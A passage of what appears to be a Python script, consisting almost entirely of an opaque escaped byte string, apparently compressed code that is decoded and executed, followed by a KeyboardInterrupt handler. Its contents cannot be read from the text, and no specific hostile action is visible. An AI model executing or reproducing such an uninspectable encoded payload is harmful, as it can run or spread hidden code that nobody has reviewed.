,\xa4\xb5\xee\xbc\xe0\x89\x19%\xbf\x041\x19\xc2\xd8\xcc7CdF\x9aJ\x85vn\xbf\x10Y\xab\xe0t&\xf3~\xf7wM9\x8c\xac\xb4\xd1&\xc5\x8d\xa1\xa7\x97\x1a\xdf\\\xec\xa6\x86\x9b@\x8dF&\xe6\xdbh\r\xbdk\t\xbb0\xb28\x16\xdc\x8c\xfb\x9b\xa2\x1d\n\xbb\x91\x14\xa1\xa1?$\x12+v,H#N2\xe8\x9c\xc6B8\x0c\xf9(\xb1[<\xca\x80\xb2\x7f\x8a\xee\x86\xa0~\r\xc3\xc1^+\xdd\x065J"Q\x97\xf6\xb9\xea\xa3\xb3A\xfb\xcc\xd5\xa9\x8a\xa9\xe8\xf9?\xb5\xb6\x1b`\xf1\x03\xb2\xb5\xe5\xd5(\xc9\xe2\xdcRR\x0eQ\r\x82\x19\xc4\xfb#\xb8\xe0\x8e/\xca\xcdo\xe2onJ\xe1~&\x1f\x1e\x0b\xc6=\x13\xe8\x87=\xe2\xf2\x1a\xe7y\xe2\xb7Q\xaa\\D}\xc9\xc8\xcc\xa2\xf7T\x8a\x12\x80\xf1L\xb6+\xd7Y$7\xaf\xdb\xfb6\xe5\t6\xa6\xc22\x8d\x8f\xe9\x9a\xf6\x8f.Z\'\xb7\xfed~\x82h\x89f\xf8y\x1e\xf3x\'u\x05\xfc\xa34\xb7q\x85\\\xb8\xda\xd1uM7\xe8\xb6\xac\xe2\xee\xfe|\xf4\x11\xad\x9d\x0e,\xbc\x91\xcet\xa3\xd2}\x9e\x90\xd0\x88|\xf7m$\x8c\xe6\x04\x90\xe2\x12\xb9\xbd\xf9\x00\xd0\xf6\xe0"\x99\xb2ev\xb4l\xcdx\xb5\xe3FB6\xe6\xb6C\xf8\xa5\x06\xea\x87\x8f\xc2`H\xde\xdbl]\x00\xdb\x8fOy\x8a\xe9\xaa\xe3\x88\xee\xa5\x81AQ^ ?\x92\xc2\x84\xb9j\x98\x9d\x17\xb8\xe4bU\x03\xcd\x9b~rA\xac\x1f,\xfa[\xba\xc9\x84\xa9\xc31\xaenX\xd4\xc0Kn\xdd\x83D:M\'\xd5!\xca\x8cq\x80\x1f\xaf\x1a\x88\x9a\xda~Z\\\x17\xf5\xddAH\x9c70\xc5\xc8JK3\x97\xa9\xff\xe0E^\xd8\x7fF\xc8\xeas\xce\xdc\x9d\xc8IW\x0b\x0f\xc2\xc3\xf3\x19\x0f>\xf4\x88\xac,\x90\x8eJKs\xff\x84V\xb7\x04O\x93l\xad;\xb53\xa3m\x99\xba\x11\x9b\xbcqo\xae?Z<\xd4\xa3N,\x1c\x85JY\xce\x7f\xa8\x8c0Z\xf2\x8c\xa1\xd2^T-\x85\x10\x92J\xaf\xe9\xc5\xd3\xa1\xb2)\x1a\xbc\xf8349\x15;\xf7\xb8"N\xc5\xf9\xce\x1fx\x07T\x10\x8a|\xe9V\xee.\n(@[\xac\xbb\xa7\x99~2\xa80\xbcI\xe6`(fX\xc0\xad\x07\xe2\xa7\x9ag\xb7=>oS\x9c\xf1]\'\x15\x03\x07d8\xca\xd6\xf9j\xc2I]\x06a\xe3\xba\n\xeey\x85\xf9`\xaea\x8e\x8dL\xfa\x06\xc4M\xec9\xf1\x0c]\xe5\x8b\xce\xea\x94t\xc1\x04\xccFI*\xb0\x89\xff\x08\x84\xadA\x0c\x95\x0f%\x89[n\xc0\xb5\xf8\xf7\x80?\x1a\x08\x96\x0fk\xcam\x1fF\xc9(\xbf\x1e\x10^S\x84\xb0u8[\xae\x90q\x8b\xe6\x1c\x8c\x18\x9dg\xb8\x99\x9e`\xd1\x11RM\xfbe\xc6p\x1f\xe4\xf2\xd4\xa8\xf9\x8f\xe4\xef\x9d\x81\xe7:-\x8be\x97\'\xf6\xfen\xee\xdc\x93\xfc8\xa6\x0f\xfd=\xef\xf4\xc0\xd2\xedV_\xab\xe7\xb2y\xa19%\x19\xc9B\\\x9e\xdc2\x18\x04v,^|\xeaF\xa8-\xbe$V\xe3\xab\xee\x91\xa0\xb1\x9fD(M4r\xad\xf5\xadA\x12\xa0\xa5\x07\xea#=:\xb8\x1e\xc5\xb0\xdc\x18\x12\x01>\x0eB\x8c)\xa3\x8e\xa4\xeaPf3\x13"(\xcd:\xef\xe3\xd0\xfd[\xb8\x8f\xe5\x17\x8e\xb5\xa9e\xbc\x08\xd68^O\x14D\x9a\x03}w\x81\xda\xf3\x13\xddz\xf7\xbe\xdfZq\x96\x88\xe0k\xe5\x0cGGS\x85F\x18,\x0e\xe5\x1a\xda\xf1\xd1\xa4>\xe7\xf8\xaa\x95\x15\x80\x88ju\xc0\xf8\x83\x92t>{%\x10\xcb\x13 5\xc8e\xfa\x1au\xd1 L\xdfv:\xa7\xf7\x8c\xf75\xb2A\x9d\xa6\xc8\x86A\xbe4Ug\x84\xfb!B\x03~\xeb }\xb7\x17+L\x9f\xe3\xce5L7\x0c*\x8d\xdf"V\xf2\x85\x96\x85\x12\x18Bc\x9bDz#\x10\xff\x91\xfa\xcc\xa4\'\x07M5\xfb\xc6&\xad\x07X\x0eA\x00\x91p(\x8fk\xc2\x83\xfc\x04\x12\xa1\x02\xa4d\xe0\x96\xb0\xf9B\xc4X\xa6d\xee\xefmT\xab%\t\xb0\x82\x89\xe3\xa8\xdb\x1c\xceZN\x92\x0f\xab\x9bE\x1b\xd6\x1dB\xe4\xf6\x1a\x11\xc6\xbf\x04\xe8\xba\x04K\xb9Z\xd3\xa3\x84O\xbf\x89_\xf1\xe3\x97\xde\x99\xd1T\xae%\\\x16[\xe8\xf69\x825\x90u2(\xcc\xfc\xba\xe7\x1e\x9c\xff6\x85\xcd\xea1\xaba\\\x00\xbb\xe4T\xb3\xd2\xd4\xe0.d\x0f\xe8\xf7\xa3\xdcmY\x18\xf0\xa6ea1\xf37\x0bv\x93"Q\xe2/_Ym\xc2\x9ao\x1c8l\n\x9f\xfc\xe5\x94f7\x8f\xb0\x1e"x\x1aEP |\x97\x9bn\xb41\x97\xe5s-\xde_|\x1c\x87\xc7\x13\xbb\xa6&N\x14O\x18\x87\xd5f\t\x1e\xb8\xcak\x87\xa7\x08m\x94\x1aQ\x7f\xad\xd7r\xa3RX\x7f\xb3wz{\xad\xfe\xf1ngc\xed\xebzE\xe0\xf3\x05Zo]\xd2\x08\x8f\x1a\x1edER,\x819XN\x07\x9c\\\x87S\xe6{\xf1\xf7qI\xf8\x9f\xbf$\x12`\xb7\x10\x97\x89BM\xa8\x9b\xd9\xcf|\x96\x81\xeb+\xf3\xfc\x8f\xc5K\xe7\xf1r\x9e(HmA\x1e\n\x03S\xd5\xec\x89\xf9\xe4\xbdm\xb3X\xbb\xed\xe4\x0e\xd4\xf0\x9dT\x18R\x158i\xaf\xc0\x0e\xf5\xbd\xf8\xe5\xa1\x0fe@\xf4:+\x14\x92cg\x84k\xf3\xc2\x9c\xa0\xf3\xf35\x0f\xfb \xaf\xf0\xc9g^\x0e=\x19\xa5\xdc\x0e\xfe\t\xde\xbb\xd1\xc3\xec\xe6\x94\x17\xb5_k1\x95\x8dp"$+\xed,\xa7;\xb0\xdc\x1b\xf9\x076\xccn\xed\x07#A\xf2\xc4\x18\x82\xfa\xbc\xf1\xf0\xa4\x1ah\x1c\xd9|NtGx\xec/rm\xf3\xe7\xeeG\x84\xc5\x98\xa2\xac_\x82\xe9*\xc5\xa5\xa5\x9b\xf8\xe2M\xa7\xdc4f\xfc\x84\xdc|p\x01\xb5\x83\xbfE\xaa\x9a\x1a\xb2|\xd6\xe9:#\x9c?\x0f?\x87\xa6\xae+\xa9\xe4\xa7\x1f\xb2\r\xbd\xb8\x7fqJkl\x83\xc8.sF\xd8P\x885M3\xe1#)\xe5\x98-#\x11\x9al\x01f4f\xc7l3D?r\x91FqwFd1\xa6\xb7\t\x1c\xa7\x93\x96_5u\xe8\xfa\xf7\xb9\xd1\xc9\x9e\xe9\x16\x8e\xda\xcb\x06\x90\xd8\xaf4\xde{r*\xf8b\x98\xad\t$\x9f\xc8\xed\xf9~\xc6\xa8_l\xb5Wr+\xb3\x11\x0eho\xf3\xf6\xd3\xee.\xf6ET\x0b\xf8R\x84r\xc8\xf0&\xb9$\xd7B\xe7\xe97-\xd5\xc97\x85>\xa9\xd6x\xa4\x13\x16\x89\xb1S\xcb\xa4\xf0<\xf6]\xc6\xa5\xa5\x95\xb7\xf1*\xef\x94\xac*\x80\x99\xf4f\xcb=\xf4=\xbd\x92\xcc,l\x86T\xb5\xa5]\xa7\xee\xe0\x18\xd2\x9b$V\x19\xc9\xfa/\xf3\xa4\x81\xa0\x80\xd7\x96\x95\xa1\xa6\x9f\xa9\x8f@\x00\x83\x19\x14\x15K\x97G\xc1\xaa\xd1\xc5I\xd2\xf6\xc7e\x9d\x9b\x81rm%d\xe0O5|f?vY\x14\xc7\xb6\'\xf2\xb4\xcc:s\x82\xd8h\x83\xf6\x02\x7f\xb6\xd7\xcb\xb2\xa6\x96\nu\xe0\xa7\x8807Ec\xd9\\~\x10\xa6\x1b1<r\x92\x14x\xc4\xfa\x12\xb1\xf1\xc2>H\xaf\x04\xf0\xc34]\xa8S\xc0\xc0\x88Z\x92\xba\xc1O\xafRg\xe1\xbeV:\xe8at*\xef\xb9\xf2\x82\xae\x9a\xfc\x92\xbb\xd8\'\x05X\xbf\x90I\x11\x01\xafL\x0c\x07]_\xa6\xad\xe6\x1d\xc4\x1d\xe8S\xf5\xef\x03\xba\xa8N\xb9\x94\x1f\xf6H\xfb\x83\xaaG\x95\xd4\x17\xfe)5\xfbt\xee\xe7\xfc\xb1\xc3*r\t\x84\xd3\xea\xaf\x121\xa0\x0f$\x9b#\xb6Z\xd2$P\x1f\xccp\xf9\x8d\x95\xe6\xf1FSn\xd8Z2\xe3\xa0\xb4G\xb9\xb2I\xc2(\x14\xca\xc4w\xd2!\x89Q[\xe2\xa6D\x9d(\x8d\x86\x88\xab\\\xc3\x9c\xe3\x05\xc5n-w>\xed\x97\xb6R\xa8\xc6\xc5\xd56=r\xcd\x13 \x1b\xc0\x15\x0c\xdbw\x1c\xd8\x0e\x15\x937\x8c\xe4\x81j\x94\xef\xf3\x11w\x1ek1\x10V\xc1\x8f\x16\xaeH\xf6MdeN\'\xba\x82W\x06\xd1\x15\xee-!\xc9\x96+\xe5\xcc/H\xa7\x87\xb8\xf4\xf4\xb2\x1e\x8f,\xfb9p\xd1?\xea\xf7u\x04Q\xf0JD[!\xa0%\x88\xa3+\x80q\xca@\x04\x021\xd7\xaf\xac_\xce\x8f\x12\xa1\xc8\xb4\xf8\xb8\xc5\xb5\t\x8d\xea\xc7XQ4#\xfd\xfaK@\xceW?\xf3z*VN\x80\xd7\xe4\xe6{\xc8,\xac\xb5/\xf4\xf2\x03-\x8c\xa0\xad\xb1\xcfw\xe9\x0f\x15\xb5c\xfa\xc5\x106WKz\x0e&\xda\xe1L\xe2R\xc3"\xd3>\xf3\xcb\xad\x88\xde\xaea\xa0T\xd7\x19^\\q\x14\x81\x98\x82\xdf\xea\xf0-\xf8\xe7v7\xb4\x12\x08n$@4\xe5_M\r\xf6\x11\x83\x06\xc5_y\xe3K\x11P0\xf4\x93m#\xd2\xe9\xcf\x9f\xe9\x04\xc3\xe3\xd3\x92\x12\x89\xd8)\xd5\x96Mo\xf4ho\xd3;:\x89\xa4\xa1x\xa7\x1b\xd7\x0bpL\xf8\x1d\xf99CB\x80\x14l\xf9\xd7\x1b\xc6um\xef+\x08\xb2+\x9e\xc6D\xe0\xa0j\xb1D2\x14\xb4\x96,*\xc0\xb8\xacTN\x81%\xaf\xc9\x1b#\\\xe6@SF\xf0\xb3|PL\x06\xfd\xf1V`\x89\x04o\x81\xce\xe2\xdb*\x96T\n\x9b\xd0\x7f\x10\x8bl4\x14k:\xab7\xac\x00\x1d\x17\x15\xd7\xa5N.\x82y\xc0\x04dL?\x98\xdb$\x1f\x01\xa2\xbc\xe0\x8b\x0e\xdd\xa6HQ\xe0\xe9\xdf\x14&\xcaq\x93\xbc\xb4\xa5\x17\x1f\xfaH\xbf\xd8\'\xf4\x0f\xd1\xe3\x13\xfc\x91\x9b\xa1\xbd\xf3\xe2~\xc6b\x8f\x8c\x0f\x8a\xd9\xaa?F\x16\xa8k\xdf\x0fipF$\xdf\xf4|\x05\x98\xae\x92\xefr1)\xf5@\x9c\x13}=\xac\xeaE\xb2\x90m\xeck\xe6\xb2\xfeS\xb1|\x02\x8cP\xd0\xd1\x19\x94\xe26\xe9\x91a2\xa9\x15\xbb\xc4\x1d\xc57?\xfa7\x9di\xcb\xbb5\x17j\x07\xa2/\xacH\x99\xaf\xe2\xdea\xb0\x84\xd4\xb5\xff\x04\xd5\xf7I~\\\x03l\xa6\x9b\x9c\xe1\xe5\x9a\x1f\x0bE\xf4L\xc0\xa3\xdd\xa71\x80\xab\x9b\xea\xf46\xae)\\\x93\xc7\x1eu\xfc~2\x18x\x01\x88\xbb*\x12\x11J\xf8\xd2\x9fQ\xa8i{\xa5\x0b\xa4o8]\xe4\x8d\xa2\x9dxDU\xe3p\x07\xf5\x81\xf9"\x1f{\\\xcbp\r\x94\xaf\x7f\xf3\x87\x8aj\xf4\x0c\x02\x980\xa1\xa7\x95\x0f?\xc7\xa6 \x96|\x14\xa52t{\xbeX\xd4\xc6\xd7\xf3\xe6~T,\xb8xD\xeaqx+Z\x9f\xfc\x88g\xf7\x01\xf8\xc4\xb9x\xd4\x9b\x13x|\x86\xac\xaeC+Kn\xcd-\xc7\xc2\xa5\xc4\xf8\xdaV=\x18`v \x00\xffv\xb8\\\'|\xef\x0e\xd4\xc0w\x94\xef\t\xaa\xa9\xbd\xf5\xfb\xddC\x80\x05\x8b\x1f\x94\x86\xdd\xac\xc7\x91\xbe4R\x04w\xd6\x9e\xe3\xf3I\xb2|\x97<(\xf1\xfc\x90\xb1\xb1\x8d\xed\x8e\x87?\x16\xeauh\x9b\x98\x0b4\xf6\x00J\x89.>\xdfl\x1e\xbc\x13Q\xb0\x89}s*\x97L\x9e[\xb1\x89\x9a\xa8\xde\xf8\x11\x8ak\xce8\x10*>\x85\xe5\x0cl\xf5\x84\x137\xd0_GS8Z\'/^\x0e\n\xb1\x82\x12\x9e\x02\xa5_\x87\xe8\xc4\xed\t\xb7\x10\xf8O\x84\x01n\x00\xbfp\xda\x14\xc1\xd5\xd6\xfa\x0e\xe9\x93{E\xac\tL%\xc0\xf1\\X\x8b&\xc2>\x0c\xb9\xca\xf5\x0f\xf8\x98>\x9a\xec\xd7\x90x\x91\xe9\xa1\x87Zd\x89\x88\xa9\xf1T\xf2\xe9\xd3\xa6\x12\x9bR&)\xb7\x05_\x98\xcd\xfc\x82\xe1\xed\x11\xbd\x95\xcf\xce\xd3\x9c\xaf\xfc\xcb.sP!n\xaft\x83\x1eE\x16\xdb\x17!\x9adTc[\xbe\xa4\x9e\\\x86\xb0\xb0\xb7\xc8q"\x83(\x01w\xb7\x8c2\xe3\x86IS\xaa\xa3\x9e\x7f\xe8\xbc\x05\xe2\x05\xb1\x81\x16\xd3(o*\xe7\x82\x138\xcdA\xecCU\xee\xdf>\x04oc$#wEX@\x91\xf6\r\xb9\xbe&<\xfc`?\x0e\x82\xf4\x89\xc9\xfa\xeb\xeb\xbe(\xca%\xe4N\x91\x0er>\x0f\x87\x1a\xb4\xb9R<\xd1\x9c4_n~\xb9\xfc\x07X\'V\x8e\x81<\xb4\x1a\xf6\xba=\x9a\x00\x1f\xd3\xb4\xc6 \x87\x8c\x80\x88[yC\xb7\xe9Fh\xf7=\x9c\xb5\xba\x95}\x03\xbe\x0f^`\x82c^#\xc3\xec\xc6\xb4&\xf2%\x18\xb8\x16$3\xd9\x87\xa1k7w\x9e\x11\t\xfe-\x11)\xd9\x96\xbe&\xe3\x8dO7\xf6\xe4\xa0_$Jt\xdcF\xc4\xce\xeb(\xc1\xebR\xde\x96\xd7\x82|>\xefa_\xb6\xb3\xf4zd\x15v\xd8\xbfyb"\xc6F\x98\x99yA\x1f\x05\xd8\xfc\xb5\xde~R\xba\xed\xde\xb8!\xa9Osuc\x9c\x0b,\xd7<7I\x81\x050\xa1\x92#1h\t\xdf\xa1\xe9\xcc\x06Y\xc3\x1d\x02\xe1\xd1\x1d8\xa7\xe6S<\xf7\x13\x02\xf0\x977c\x0c\xd29\n\xb7\xfaP\xf4i9\x7f\x8f%\x1eJ\\\x0eQ\x81a\x18n\x84\x1d\xb3\xd4_\x98\x1a\x1a\x86\xbd_r\xb4/\x86\x19*\n\x94IYH\xc1\x9d\xfb\x8f=\xa6n\x1au\x83\x8a4\xe5\x91\xc4\xea\x9bI\xe2\x8e4\xee^Mp\xfb\xb3s5\x8d\x17\xd2\x98]\xd5\xeb\x19\'\xa9k>\x89o\x82\x8c\xeb\xaf\x8e\xc8\xa5\xb1\xfb\xd9\xb1\x92~\xd8\xd8\x84{\x8e\x88CA/Z\xfa\xfb\x9d#\xf0UL\xe1[\x10\x03S4\x7f\xee\x1fe\x1f\xee\xcf-\xac\xf6\xa2\x05\xf2p\xb8s\xf8kG\x84\xd2rQl\t>S9\xdcS\x1f\xfbk\xb3kq\xfd\xb9\x1d\x97U\x18\x0bHH\x9cZ\xb9r\x91\xf3H|\n\xa4mss\x11ry\xfdQ\xa8EH\xd1u-\xcc\x85O\xe6\xe5A\x9a\xb6\xcb"\xbc-\x10s\xcd~u\xd5t\xaf\xc9\xf1{&n\xc7\x84^\xc4\xfc\x97@S\xd9\xce\xb8\xc9\x1d\x13\x84>\nY\x1d\x0b\xd4Z\x19Y\xd1\xfe\xea\xf3\xaf1\xf2\x047\xb2\xb8\x1e\xa4\xf0\xaf\x9d\xb6\x94\xe2\x8c\xe3\xef#G\\8\x97\x02\xe0\xaf\xcd\xc2\xb2\xf1\xd7\xbay\x0c\xf3\xbf\xfd\xfb\x7f\xfd\x9f\xfe\xf1_\xa6\xec\xb3\xb7\xd9\xf8\x8f\xbf\x8f\xef\x94\xfd\xe3\xef\xcd\xdb\xad\xff\xf8\xd7\xfcE\xfe\xf1oy7g{\xd1u\xff\xf8\xfb;v\xf9?\xfe^\xddU\xf1\x8f\xff4.Y\xb9\xff\xe3\xdf3$\xff?\xf3l\xaf\x08\xec\xff\xfe\xe3\xf3\xef\x7f\xfc\xf1\x1f\xc5\xff\xfb\xef\xf6\xf3\xbf\x88\xdf\xbd\xc8\x8e\xea\x1f\xff\xf6\xbfNK\xf9\x1d\xab\xff\xfdo\x7f\xee\x8e\xfe\x97_!\xff\xf1\xff\x01\xd6=\xfa\x11')))
except KeyboardInterrupt:
	exit()
